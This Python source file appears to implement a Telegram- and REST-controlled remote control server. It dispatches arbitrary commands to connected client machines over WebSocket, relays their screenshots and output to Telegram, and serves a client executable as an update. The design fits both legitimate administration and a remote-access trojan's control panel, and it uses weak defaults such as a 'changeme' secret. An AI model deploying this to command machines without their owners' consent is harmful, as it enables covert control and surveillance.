"""
Remote Control Server — финальная версия
HTTP (aiohttp) + WebSocket + Telegram + REST API.
"""

import asyncio
import base64
import io
import json
import logging
import os
import re
from datetime import datetime
from pathlib import Path

from aiohttp import web
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
log = logging.getLogger("rc")

BOT_TOKEN = os.getenv("BOT_TOKEN", "")
ADMIN_IDS = {int(x) for x in os.getenv("ADMIN_IDS", "").split(",") if x.strip()}
SECRET_KEY = os.getenv("SECRET_KEY", "changeme")
PUBLIC_URL = os.getenv("PUBLIC_URL", "http://localhost:8080")
PORT = int(os.getenv("PORT", 8080))
UPDATE_VERSION = int(os.getenv("UPDATE_VERSION", "1"))
UPDATE_EXE_URL = os.getenv("UPDATE_EXE_URL", "")


class ClientRegistry:
    """Реестр клиентов. Активность = живой WebSocket."""

    def __init__(self):
        self.clients: dict[str, web.WebSocketResponse | None] = {}
        self.last_seen: dict[str, str] = {}
        self.history: list[dict] = []

    @staticmethod
    def _now() -> str:
        return datetime.now().strftime("%H:%M:%S")

    @staticmethod
    def is_alive(ws: web.WebSocketResponse | None) -> bool:
        if ws is None:
            return False
        try:
            return not ws.closed
        except Exception:
            return False

    async def try_send(self, name: str, payload: dict, wait_secs: float = 5.0) -> bool:
        ws = self.clients.get(name)
        if self.is_alive(ws):
            try:
                await ws.send_json(payload)
                return True
            except Exception as e:
                log.warning(f"Send to '{name}' failed: {e}")

        deadline = asyncio.get_event_loop().time() + wait_secs
        while asyncio.get_event_loop().time() < deadline:
            await asyncio.sleep(0.25)
            ws = self.clients.get(name)
            if self.is_alive(ws):
                try:
                    await ws.send_json(payload)
                    return True
                except Exception:
                    break
        return False

    def register(self, name: str, ws: web.WebSocketResponse) -> None:
        self.clients[name] = ws
        self.last_seen[name] = self._now()

    def disconnect(self, name: str, ws: web.WebSocketResponse) -> None:
        if self.clients.get(name) is ws:
            self.clients[name] = None

    def touch(self, name: str) -> None:
        self.last_seen[name] = self._now()

    def add_result(self, script: str, command: str, result: str) -> None:
        short = result[:200] if len(result) < 1000 else "[Screenshot / Binary]"
        self.history.append({
            "time": self._now(),
            "script": script,
            "command": command[:80],
            "result": short,
        })
        if len(self.history) > 200:
            self.history.pop(0)

    def all_names(self) -> set[str]:
        return set(self.clients.keys()) | set(self.last_seen.keys())

    def online_names(self) -> list[str]:
        return [n for n, w in self.clients.items() if self.is_alive(w)]


registry = ClientRegistry()
tg_app: Application | None = None


def _extract_image_bytes(text: str) -> bytes | None:
    """Извлечь PNG/JPEG из ответа клиента (включая [SCREENSHOT_B64])."""
    raw = text.strip()

    # Формат клиента: [SCREENSHOT_B64]1920x1080\n<base64>
    m = re.match(r"^\[SCREENSHOT_B64\][^\n]*\n(.+)$", raw, re.DOTALL)
    if m:
        raw = m.group(1).strip()

    if raw.startswith("data:image"):
        raw = raw.split(",", 1)[-1].strip()

    # OK 1920x1080\n<link> — не картинка
    if raw.startswith("OK ") and "\nhttp" in raw:
        return None

    # Чистый base64 или с префиксом PNG/JPEG
    b64 = raw
    if not re.match(r"^[A-Za-z0-9+/=]+$", b64[:80].replace("\n", "")):
        # Попробуем найти base64 после первой строки
        lines = raw.split("\n")
        for line in reversed(lines):
            line = line.strip()
            if len(line) > 200 and re.match(r"^[A-Za-z0-9+/=]+$", line[:80]):
                b64 = line
                break
        else:
            return None

    try:
        data = base64.b64decode(b64, validate=False)
        if len(data) > 100 and data[:4] in (b"\x89PNG", b"\xff\xd8\xff", b"GIF8"):
            return data
    except Exception:
        pass
    return None


async def send_telegram(chat_id: int, text: str, client_name: str = "Script") -> None:
    if not tg_app or not chat_id:
        return
    try:
        img_bytes = _extract_image_bytes(text)
        if img_bytes:
            image_file = io.BytesIO(img_bytes)
            image_file.name = f"screenshot_{client_name}.png"
            await tg_app.bot.send_photo(
                chat_id=chat_id,
                photo=image_file,
                caption=f"📸 Скриншот от [{client_name}]",
            )
            return

        chunks = [text[i : i + 4000] for i in range(0, len(text), 4000)]
        for chunk in chunks[:3]:
            await tg_app.bot.send_message(chat_id=chat_id, text=f"[{client_name}]\n{chunk}")
    except Exception as e:
        log.error(f"Telegram send failed: {e}")


async def ws_handler(request: web.Request) -> web.WebSocketResponse:
    ws = web.WebSocketResponse(heartbeat=25)
    await ws.prepare(request)
    client_name = None
    try:
        async for msg in ws:
            if msg.type != web.WSMsgType.TEXT:
                break
            try:
                data = json.loads(msg.data)
                mtype = data.get("type", "")

                if mtype == "register":
                    name = data.get("name", "").strip()
                    if data.get("secret", "") != SECRET_KEY:
                        await ws.send_json({"type": "error", "msg": "Invalid secret key"})
                        await ws.close()
                        return ws
                    client_name = name
                    registry.register(name, ws)
                    log.info(f"+ {name} registered")
                    await ws.send_json({"type": "ok"})

                elif mtype == "result":
                    cmd = data.get("command", "")
                    result = data.get("result", "")
                    chat_id = data.get("reply_chat_id")
                    registry.add_result(client_name or "?", cmd, result)
                    if chat_id:
                        await send_telegram(int(chat_id), result, client_name or "Script")

                elif mtype == "ping" and client_name:
                    registry.touch(client_name)
            except Exception as e:
                log.warning(f"msg parse error: {e}")
    except Exception as e:
        log.warning(f"ws error ({client_name}): {e}")
    finally:
        if client_name:
            registry.disconnect(client_name, ws)
    return ws


async def tg_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_user.id in ADMIN_IDS:
        await update.message.reply_text(
            "🖥 Remote Control — Admin\n\n"
            "/send <script> <cmd>\n/broadcast <cmd>\n/scripts"
        )
    else:
        await update.message.reply_text("🖥 Remote Control")


async def tg_send(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ Admin only")
        return
    args = " ".join(ctx.args)
    if not args:
        await update.message.reply_text("Usage: /send <script> <command>")
        return
    parts = args.split(None, 1)
    if len(parts) < 2:
        await update.message.reply_text("Usage: /send <script> <command>")
        return
    name, cmd = parts[0], parts[1]
    if name not in registry.clients and name not in registry.last_seen:
        await update.message.reply_text(f"❌ Script '{name}' not found.")
        return
    ok = await registry.try_send(name, {
        "type": "command",
        "command": cmd,
        "reply_chat_id": update.effective_chat.id,
    })
    if ok:
        await update.message.reply_text(f"✅ Sent to {name}")
    else:
        await update.message.reply_text(
            f"❌ '{name}' not connected. Last seen: {registry.last_seen.get(name, 'never')}"
        )


async def tg_broadcast(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ Admin only")
        return
    cmd = " ".join(ctx.args)
    if not cmd:
        await update.message.reply_text("Usage: /broadcast <command>")
        return
    sent = []
    for name, ws in registry.clients.items():
        if registry.is_alive(ws):
            try:
                await ws.send_json({
                    "type": "command",
                    "command": cmd,
                    "reply_chat_id": update.effective_chat.id,
                })
                sent.append(name)
            except Exception:
                pass
    await update.message.reply_text(f"📡 Broadcast: {', '.join(sent) or 'none'}")


async def tg_scripts(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ Admin only")
        return
    names = registry.all_names()
    if not names:
        await update.message.reply_text("No scripts connected yet.")
        return
    lines = ["📋 Scripts:\n"]
    for name in sorted(names):
        ws = registry.clients.get(name)
        icon = "🟢" if registry.is_alive(ws) else "🔴"
        lines.append(f"{icon} {name}  ({registry.last_seen.get(name, 'never')})")
    await update.message.reply_text("\n".join(lines))


async def tg_panel(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ Admin only")
        return
    await update.message.reply_text(f"🌐 Panel: {PUBLIC_URL}/admin\nKey: {SECRET_KEY}")


async def h_keepalive_ping(request: web.Request) -> web.Response:
    return web.Response(text="OK")


async def h_status(request: web.Request) -> web.Response:
    online = registry.online_names()
    return web.json_response({
        "status": "ok",
        "online": online,
        "offline": [n for n in registry.all_names() if n not in online],
    })


async def h_scripts(request: web.Request) -> web.Response:
    if request.headers.get("X-Admin-Key", "") != SECRET_KEY:
        return web.json_response({"error": "Unauthorized"}, status=401)
    scripts = sorted([
        {
            "name": n,
            "connected": registry.is_alive(registry.clients.get(n)),
            "last_seen": registry.last_seen.get(n, "never"),
        }
        for n in registry.all_names()
    ], key=lambda x: (not x["connected"], x["name"]))
    return web.json_response({"scripts": scripts, "history": registry.history[-30:]})


async def h_send(request: web.Request) -> web.Response:
    if request.headers.get("X-Admin-Key", "") != SECRET_KEY:
        return web.json_response({"error": "Unauthorized"}, status=401)
    try:
        data = await request.json()
    except Exception:
        return web.json_response({"error": "Bad JSON"}, status=400)
    name = data.get("script", "").strip()
    cmd = data.get("command", "").strip()
    if not name or not cmd:
        return web.json_response({"error": "script and command required"}, status=400)
    ok = await registry.try_send(name, {
        "type": "command",
        "command": cmd,
        "reply_chat_id": data.get("reply_chat_id"),
    })
    return web.json_response({"status": "sent"} if ok else {"error": "not connected"}, status=200 if ok else 503)


async def h_broadcast(request: web.Request) -> web.Response:
    if request.headers.get("X-Admin-Key", "") != SECRET_KEY:
        return web.json_response({"error": "Unauthorized"}, status=401)
    try:
        data = await request.json()
        cmd = data.get("command", "").strip()
    except Exception:
        return web.json_response({"error": "Bad JSON"}, status=400)
    if not cmd:
        return web.json_response({"error": "command required"}, status=400)
    sent = []
    for name, ws in registry.clients.items():
        if registry.is_alive(ws):
            try:
                await ws.send_json({"type": "command", "command": cmd})
                sent.append(name)
            except Exception:
                pass
    return web.json_response({"sent_to": sent, "count": len(sent)})


async def h_version(request: web.Request) -> web.Response:
    return web.json_response({"version": UPDATE_VERSION, "url": UPDATE_EXE_URL})


async def h_update(request: web.Request) -> web.Response:
    local_exe = Path(__file__).parent / "RemoteControl.exe"
    if local_exe.exists():
        return web.FileResponse(local_exe, headers={
            "Content-Disposition": "attachment; filename=RemoteControl.exe"
        })
    if UPDATE_EXE_URL:
        raise web.HTTPFound(UPDATE_EXE_URL)
    return web.json_response({"error": "No update file"}, status=404)


async def main() -> None:
    global tg_app
    if BOT_TOKEN:
        tg_app = Application.builder().token(BOT_TOKEN).build()
        for cmd, handler in [
            ("start", tg_start), ("send", tg_send), ("broadcast", tg_broadcast),
            ("scripts", tg_scripts), ("panel", tg_panel),
        ]:
            tg_app.add_handler(CommandHandler(cmd, handler))
        await tg_app.initialize()
        await tg_app.start()
        asyncio.create_task(tg_app.updater.start_polling())
        log.info("Telegram bot started")
    else:
        log.warning("BOT_TOKEN not set")

    app = web.Application()
    app.router.add_get("/", h_keepalive_ping)
    app.router.add_get("/ws", ws_handler)
    app.router.add_get("/api/status", h_status)
    app.router.add_get("/api/scripts", h_scripts)
    app.router.add_post("/api/send", h_send)
    app.router.add_post("/api/broadcast", h_broadcast)
    app.router.add_get("/version", h_version)
    app.router.add_get("/update", h_update)

    runner = web.AppRunner(app)
    await runner.setup()
    await web.TCPSite(runner, "0.0.0.0", PORT).start()
    log.info(f"Server on :{PORT}  WS: {PUBLIC_URL.replace('http', 'ws')}/ws")
    try:
        await asyncio.Future()
    finally:
        await runner.cleanup()


if __name__ == "__main__":
    asyncio.run(main())
